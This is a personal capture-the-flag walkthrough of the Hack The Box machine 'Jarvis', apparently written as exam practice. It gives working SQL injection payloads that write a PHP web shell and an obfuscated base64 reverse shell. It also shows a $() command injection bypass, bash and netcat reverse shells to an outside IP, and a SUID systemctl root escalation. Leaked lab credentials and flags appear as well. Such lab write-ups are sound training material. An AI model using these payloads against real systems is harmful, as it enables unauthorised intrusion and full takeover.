
Target : 10.129.229.137

Started off with the port scan : 22,80,64999

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Enumerating Port : 80

**Directory bruteforcing using gobuster:**

`gobuster dir -u "http://supersecurehotel.htb/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`

```
.htpasswd            (Status: 403) [Size: 285]
.hta                 (Status: 403) [Size: 285]
.htaccess            (Status: 403) [Size: 285]
css                  (Status: 301) [Size: 326] [--> http://supersecurehotel.htb/css/]
fonts                (Status: 301) [Size: 328] [--> http://supersecurehotel.htb/fonts/]
images               (Status: 301) [Size: 329] [--> http://supersecurehotel.htb/images/]
index.php            (Status: 200) [Size: 23628]
js                   (Status: 301) [Size: 325] [--> http://supersecurehotel.htb/js/]
phpmyadmin           (Status: 301) [Size: 333] [--> http://supersecurehotel.htb/phpmyadmin/]
server-status        (Status: 403) [Size: 285]
```

Got nothing interesting.

While exploring the application, found it is supersecurehotel.htb

added in /etc/hosts

`10.129.229.137 supersecurehotel.htb`

Also, while checking the footer, noticed email is in `supersecurehotel@logger.htb`

so i added logger.htb in the /etc/hosts too

**Fuzzing Subdomain using ffuf:**

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.supersecurehotel.htb" -u http://supersecurehotel.htb/ -fl 544`

Found nothing for *supersecurehotel.htb*

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.logger.htb" -u http://logger.htb/ -fl 544`

Found nothing for *logger.htb*

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.jarvis.htb" -u http://10.129.229.137/ -fl 544
`
Found nothing for *jarvis.htb*


While exploring found a parameter, i suspected whether it's vulnerable to SQL injection, but i couldn't find its vulnerable:  `/room.php?cod=`

```
-1 union select 1,database(),user(),4,5,6,7
-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7 into outfile '/var/www/html/hacked.txt'

To confirm the web directory root path, verify the apache configuratiion /etc/apache2/sites-enabled/000-default.conf

-1 union select 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/shell.php'

curl -X POST "http://jarvis.htb/pwn.php" --data-urlencode exec='echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjQxLzEyMzQgMD4mMQ== | base64 -d | bash'
```

Got shell as `www-data`

```
www-data@jarvis:/var/www/html$ cat connection.php 
<?php
$connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');
?>

```

Database credentials : `DBadmin : imissyou`

Privilege Escalation to user : pepper

```
www-data@jarvis:/var/www/html$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

```
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

This is the vulnerable code snippet, it actually restricts [&, ; , -, `, ||, |]

simply we can use $() to execute commands

$(whoami) -> pepper

then created a reverse shell script in /tmp folder and modified its permission to exectuable and triggered by $(/tmp/shell.sh)

```shell.sh
#!/bin/bash

sh -i >& /dev/tcp/10.10.16.241/4444 0>&1
```

got the user flag. 

pepper@jarvis:~$ cat user.txt 
6c699cc08161f9099c084dc81465e1bb

**Root Escalation:**

Suid binary reveals, systemctl 

![](../Pasted%20image%2020260713171537.png)

GTfo bins exploit suggestion for suid enabled systemctl 

```
echo '[Service]
Type=oneshot
ExecStart=/tmp/root.sh
[Install]
WantedBy=multi-user.target' >/home/pepper/root.service

systemctl link /home/pepper/root.service
systemctl enable --now /home/pepper/root.service
```

```
echo -e '#!/bin/bash\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.241 4445 >/tmp/f' > /home/pepper/root.sh

```


Finally got the root shell

```
# cat root.txt
644a2e4c9a0a897f2d33866e46f33bea
```




To be noted:

1. Got stucked in web directory enumeration, before the SQL injection, i noticed the injection before, but sqlmap couldn't identify it, so i skipped it. (Need to work more on my sql injection skills, as sqlmap is not allowed for the OSCP examination)
2. Identified the escalation vector from www-data to pepper, even the vulnerable part of the code, but stuck in the execution of bypass. 
3. Root escalation is piece of cake, initial reverse shell payload, not worked, but after changing the payload, it worked